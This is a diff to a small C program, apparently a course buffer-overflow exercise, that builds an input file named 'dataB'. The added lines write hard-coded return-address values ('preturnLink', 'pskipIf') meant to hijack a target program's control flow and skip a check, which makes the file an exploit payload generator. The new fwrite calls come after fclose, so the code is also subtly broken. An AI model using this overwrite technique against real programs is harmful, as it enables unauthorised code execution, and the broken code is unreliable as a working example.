@@ -14,6 +14,8 @@
 int main(void){
    FILE *psFile;
    unsigned long ulData;
+   unsigned long preturnLink;
+   unsigned long pskipIf;
    int i;
 
    psFile = fopen("dataB", "w");
@@ -25,10 +27,15 @@ int main(void){
    /* Writes the null byte at the end of the students names*/
    for (i = 0; i < 5; i++)
       putc('\0', psFile); /* Writes '00000000' */
-
    fclose(psFile);
 
-   
+   preturnLink = 0x400850;
+   fwrite(&preturnLink, sizeof(unsigned long), 1, psFile);
+
+   pskipIf = 0x40088c;
+   fwrite(&pskipIf, sizeof(unsigned long), 1, psFile);
+
+
 
    return 0;
 }
